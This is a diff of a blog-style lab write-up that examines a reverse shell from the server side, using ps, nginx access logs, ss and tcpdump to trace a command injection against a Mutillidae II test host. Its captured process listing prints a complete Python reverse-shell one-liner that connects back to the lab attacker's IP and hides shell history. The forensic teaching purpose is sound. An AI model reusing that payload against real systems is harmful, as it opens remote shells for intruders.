@@ -1,173 +1,290 @@
-# Reverse Shell: Process – Log – Network
+# Reverse Shell: Process, Log, and Network Analysis
 
 [🇮🇩 Read in Indonesian](reverse-shell-server-side.md)
 
-[In the previous article](https://imoon07.github.io/read.html?post=command-injection-reverse-shell&lang=en), I demonstrated how a reverse shell can be executed from the attacker's perspective (Red Team). In this article, I want to look at the same attack from the server's point of view. Instead of focusing on how the shell is obtained, I want to understand what happens inside the server after the attack succeeds.
+Hello everyone,
 
-This article documents a simple lab experiment to observe the artifacts left behind by a reverse shell. My goal is to answer a few basic questions:
+In the previous article, we successfully obtained a **Reverse Shell** through a **Command Injection** vulnerability in the **Mutillidae II** web application.
 
-- What processes are created?
-- What logs are generated?
-- What network connections are established?
+👉 **Previous article:**
 
-As I continued experimenting in my lab, I became curious about what actually happens behind the scenes when a reverse shell is successfully established.
+https://imoon07.github.io/read.html?post=command-injection-reverse-shell&lang=en
 
-## Flow: What Happens on the Server?
+This time, we'll switch perspectives.
+
+Instead of looking at the attack from the attacker's point of view, we'll examine it from the server side to understand what artifacts are left behind after a Reverse Shell is established.
+
+This article focuses on three primary artifacts that can be observed directly on a Linux server:
+
+- Process
+- Log
+- Network
+
+---
+
+# What is Reverse Shell Analysis?
+
+Reverse Shell Analysis is the process of investigating a compromised server after a Reverse Shell has been executed.
+
+Rather than explaining how the payload works, this article focuses on **what changes inside the operating system** once the attacker gains remote shell access.
+
+Understanding these artifacts helps system administrators, security analysts, and incident responders identify suspicious activity and reconstruct an attack.
+
+---
+
+# Why is it Important?
+
+Once a Reverse Shell is established, the server typically leaves several observable artifacts, including:
+
+- Newly spawned processes
+- Web server access logs
+- Outbound network connections
+
+Although different payloads may be used, these artifacts often remain consistent and provide valuable evidence during an investigation.
+
+---
+
+# Prerequisites
+
+This article continues from the previous Reverse Shell demonstration.
+
+Before following this guide, make sure a Reverse Shell has already been established through a **Command Injection** vulnerability.
 
 ```text
-[ Browser (Attacker) ]
-         │ HTTPS Request
-         ▼
-[ Nginx (Port 443) ]
-         │ Forward Request
-         ▼
-[ PHP (www-data) ]
-         │ Command Injection
-         ▼
-[ Operating System ]
-         │ Execute Python
-         ▼
-[ Reverse Shell ]
-         │ Outbound Connection
-         ▼
-[ Attacker Host ]
+Command Injection
+        │
+        ▼
+Command Execution
+        │
+        ▼
+Reverse Shell
 ```
 
-To investigate these activities, I used several built-in Linux utilities to observe the server while the attack was running.
+---
 
-### Process
+# Investigation Flow
 
-The first thing I wanted to examine was the running process. During the attack, we can identify suspicious processes executed by the web server user.
+```text
+         Reverse Shell
+                │
+                ▼
+     Process Investigation
+                │
+                ▼
+       Log Investigation
+                │
+                ▼
+    Network Investigation
+```
+
+---
+
+# Lab Topology
+
+| Role | Description | IP Address |
+| :--- | :--- | :--- |
+| **Attacker** | Kali Linux | `10.10.10.149` |
+| **Target** | Ubuntu Server (Mutillidae II) | `10.10.10.2` |
+
+---
+
+# Demonstration
+
+## 1. Process Investigation
+
+The first step is identifying suspicious processes running on the target system.
 
 ```bash
-# Display running Python processes
-ps aux | grep -E 'python'
+ps aux | grep python
 ```
 
-**Lab Output:**
+![Process](proses-from-user-www-data.png)
 
-![Proses dari user www-data](proses-from-user-www-data.png)
+### Output
 
 ```text
 root         874  0.0  1.1 109688 23292 ?        Ssl  11:57   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
 www-data    3861  0.0  0.0   2800  1852 ?        S    16:13   0:00 sh -c -- nslookup google.com; python3 -c 'import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.149",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close();'
 www-data    3868  0.0  0.5  18648 11736 ?        S    16:13   0:00 python3 -c import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.149",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close();
-root        3886  0.0  0.1   6544  2328 pts/4    S+   16:18   0:00 grep --color=auto -E python
 ```
 
-The output clearly shows that the `www-data` user, which normally runs the web service, executed the following command:
+### What was found?
 
-`nslookup google.com; python3 -c 'import os,pty,socket...'`
+The output shows a `python3` process running under the **www-data** account, which is typically used by Apache or Nginx to execute web applications.
 
-This confirms that the Command Injection vulnerability successfully executed a Python reverse shell connecting back to the attacker's machine (`10.10.10.149:9001`). The processes with PID 3861 and 3868 are strong indicators of suspicious activity because the web server should not normally execute an interactive Python shell.
-
-### Log
-
-Every request received by Nginx is recorded in the access log. Reviewing these logs helps identify which endpoint was targeted during the attack.
-
-![Command Injection Web](Command-injection.png)
-
-```bash
-# Monitor incoming HTTP requests
-tail -f /var/log/nginx/access.log
-```
-
-**Lab Output:**
-
-![Log Nginx](log-nginx.png)
+It also reveals the following payload:
 
 ```text
-10.10.10.149 - - [26/Jun/2026:16:10:05 +0700] "POST /index.php?page=dns-lookup.php HTTP/1.1" 200 8771 "https://mutillidae.owasp.hacking/index.php?page=dns-lookup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
-10.10.10.149 - - [26/Jun/2026:16:10:55 +0700] "POST /index.php?page=dns-lookup.php HTTP/1.1" 200 8773 "https://mutillidae.owasp.hacking/index.php?page=dns-lookup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
-10.10.10.149 - - [26/Jun/2026:16:14:15 +0700] "POST /index.php?page=dns-lookup.php HTTP/1.1" 504 176 "https://mutillidae.owasp.hacking/index.php?page=dns-lookup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
+nslookup google.com;
+python3 -c ...
 ```
 
-The access log shows multiple HTTP POST requests targeting `/index.php?page=dns-lookup.php` from the attacker's IP address (`10.10.10.149`).
+### What does it mean?
 
-This finding is consistent with the process observed earlier. The attacker abused the DNS Lookup functionality to inject additional commands, as shown by the `nslookup google.com` command inside the payload. Although the HTTP request itself appears legitimate, the server-side process reveals that arbitrary commands were executed after the request was processed.
+Under normal circumstances, the `www-data` account should only execute web application processes.
 
-### Network
+If this account starts running interpreters such as **Python**, **Bash**, **Perl**, or other scripting languages that initiate outbound connections, it is a strong indicator of **Command Injection** or **Remote Code Execution (RCE)**.
 
-One of the most recognizable characteristics of a reverse shell is an outbound connection initiated by the compromised server.
-
-```bash
-# Display active TCP connections
-ss -tnp
-```
-
-**Lab Output:**
-
-![State Active Open Port](state-active-open-port.png)
-
-```text
-State         Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process
-...
-ESTAB         0         0               10.10.10.2:49342       10.10.10.149:9001     users:(("python3",pid=3868,fd=3),("python3",pid=3868,fd=2),("python3",pid=3868,fd=1),("python3",pid=3868,fd=0))
-...
-```
-
-The output shows an `ESTABLISHED` TCP connection from the server (`10.10.10.2`) to the attacker's machine (`10.10.10.149`) on port `9001`. More importantly, the connection is owned by the `python3` process (PID 3868), matching the process identified in the previous step. This correlation confirms that the Python process is responsible for maintaining the reverse shell session.
-
-To inspect the network traffic in more detail, I captured packets using `tcpdump`.
-
-```bash
-# Capture reverse shell traffic
-sudo tcpdump -i any port 9001 -nn -A -l
-```
-
-**Lab Output:**
-
-![Network tcpdump](network-tcpdump.png)
-
-```text
-16:13:15.687717 ens33 Out IP 10.10.10.2.49342 > 10.10.10.149.9001: Flags [P.], seq 1:49, ack 1, win 502, options [nop,nop,TS val 1701540689 ecr 1928400169], length 48
-E..d..@.@..5
-
-
-.
-
-
-...#).....#......)......
-eksQr..)www-data@server01:/var/www/hack/mutillidae/src$
-```
-
-Because the reverse shell communication is transmitted without encryption, the session can be observed directly in plaintext. The packet capture reveals the interactive shell prompt: `www-data@server01:/var/www/hack/mutillidae/src$`. This confirms that the attacker successfully obtained an interactive shell on the target server.
+In this lab, the Python process becomes the first artifact indicating a successful Reverse Shell.
 
 ---
 
-## Conclusion
+## 2. Log Investigation
 
-This simple investigation helped me understand what happens behind the scenes after a reverse shell is established.
+The next step is reviewing incoming requests recorded by the web server.
 
-By examining running processes, application logs, and network connections, I was able to correlate multiple pieces of evidence that describe the attack from the server's perspective. Rather than focusing only on how the attack works, observing the artifacts left behind provides valuable insight into how defenders can investigate suspicious activity.
+```bash
+tail -f /var/log/nginx/access.log
+```
 
-One question naturally came to mind after completing this experiment:
+![Command Injection](Command-injection.png)
 
-*Can these indicators be detected automatically without manually checking processes, logs, and network connections?*
+![Nginx Access Log](log-nginx.png)
 
-That question will be the starting point for the next article, where I plan to explore runtime detection using Falco.
+### Output
 
-## References
+```text
+10.10.10.149 - - [26/Jun/2026:16:10:05 +0700] "POST /index.php?page=dns-lookup.php HTTP/1.1" 200 8771
+10.10.10.149 - - [26/Jun/2026:16:10:55 +0700] "POST /index.php?page=dns-lookup.php HTTP/1.1" 200 8773
+10.10.10.149 - - [26/Jun/2026:16:14:15 +0700] "POST /index.php?page=dns-lookup.php HTTP/1.1" 504 176
+```
 
-**Tools & Utilities:**
+### What was found?
 
-- [tcpdump](https://www.tcpdump.org) — Network packet capture and analysis
-- [ss](https://man7.org/linux/man-pages/man8/ss.8.html) — Display active socket connections
-- [ps](https://man7.org/linux/man-pages/man1/ps.1.html) — Process monitoring
-- [tail](https://man7.org/linux/man-pages/man1/tail.1.html) — Real-time log monitoring
-- [grep](https://man7.org/linux/man-pages/man1/grep.1.html) — Filter process and log output
+Multiple HTTP POST requests were sent to the following endpoint:
 
-**Official Documentation:**
+```text
+/index.php?page=dns-lookup.php
+```
 
-- [Nginx Documentation: Access Log](https://nginx.org/en/docs/http/ngx_http_log_module.html)
-- [Python Documentation: socket module](https://docs.python.org/3/library/socket.html)
-- [Python Documentation: pty module](https://docs.python.org/3/library/pty.html)
+originating from the attacker's IP address.
 
-**MITRE ATT&CK:**
+### What does it mean?
 
-- [T1059: Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
-- [T1059.006: Python](https://attack.mitre.org/techniques/T1059/006/)
+The repeated requests indicate that the attacker abused the vulnerable DNS Lookup feature to execute arbitrary commands.
 
-Thank you for reading!
+Although the access log does not display the injected payload itself, information such as the source IP address, requested endpoint, HTTP method, and timestamps can be correlated with the suspicious Python process discovered earlier.
 
-Happy learning! 🔥
+---
+
+## 3. Network Investigation
+
+One of the defining characteristics of a Reverse Shell is an outbound connection initiated by the compromised server.
+
+Check active TCP connections using:
+
+```bash
+ss -tnp
+```
+
+![Established Connection](state-active-open-port.png)
+
+### Output
+
+```text
+State      Recv-Q Send-Q Local Address:Port    Peer Address:Port
+ESTAB      0      0      10.10.10.2:49342      10.10.10.149:9001
+users:(("python3",pid=3868,fd=3))
+```
+
+### What was found?
+
+An **ESTABLISHED** TCP connection exists between the server and the attacker's machine on port **9001**.
+
+The connection belongs to the **python3** process with PID **3868**.
+
+### What does it mean?
+
+This confirms that the same Python process identified during the process investigation is responsible for maintaining the Reverse Shell connection.
+
+Correlating the **process**, **PID**, and **network connection** provides strong evidence that an interactive Reverse Shell session is active.
+
+---
+
+To inspect the network traffic itself, packet capture can be performed using:
+
+```bash
+sudo tcpdump -i any port 9001 -nn -A
+```
+
+![tcpdump](network-tcpdump.png)
+
+### Output
+
+```text
+16:13:15.687717 ens33 Out IP 10.10.10.2.49342 > 10.10.10.149.9001
+
+www-data@server01:/var/www/hack/mutillidae/src$
+```
+
+### What was found?
+
+The packet capture reveals an interactive shell prompt:
+
+```text
+www-data@server01:/var/www/hack/mutillidae/src$
+```
+
+### What does it mean?
+
+Since this Reverse Shell communicates over an unencrypted TCP session, its contents can be observed directly in plaintext.
+
+The shell prompt confirms that the attacker successfully obtained an interactive shell on the target server.
+
+---
+
+# Summary of Findings
+
+| Artifact | Observation |
+| :--- | :--- |
+| **Process** | `python3` executed by the `www-data` account |
+| **Log** | Repeated HTTP POST requests targeting `dns-lookup.php` |
+| **Network** | Outbound TCP connection to the attacker's host on port `9001` |
+
+These artifacts complement one another and provide a clear picture of the attack without requiring specialized forensic tools.
+
+---
+
+# What Comes Next?
+
+Now that we've examined the artifacts left behind by a Reverse Shell, the next step is performing **Linux Enumeration** to better understand the compromised system.
+
+The following topics will include:
+
+- Current user identification
+- Operating system and kernel information
+- File system exploration
+- Network configuration
+- Running services and processes
+
+---
+
+# Conclusion
+
+A Reverse Shell provides remote access to an attacker, but it also leaves observable traces on the target system.
+
+By investigating **running processes**, **web server logs**, and **network connections**, defenders can reconstruct the attack and better understand how the compromise occurred.
+
+Although this demonstration was performed in a controlled lab environment, the same investigation approach can serve as a practical foundation for analyzing suspicious post-exploitation activity on Linux systems.
+
+---
+
+# References
+
+- MITRE ATT&CK – T1059: Command and Scripting Interpreter  
+  https://attack.mitre.org/techniques/T1059/
+
+- Nginx Documentation – Access Log  
+  https://nginx.org/en/docs/http/ngx_http_log_module.html
+
+- Linux Manual Pages  
+  https://man7.org/linux/man-pages/
+
+- tcpdump Documentation  
+  https://www.tcpdump.org/
+
+---
+
+Thank you for reading.
+
+I hope this article helps you better understand how a Reverse Shell appears from the server's perspective and how simple Linux utilities can be used to investigate suspicious activity in a controlled environment.
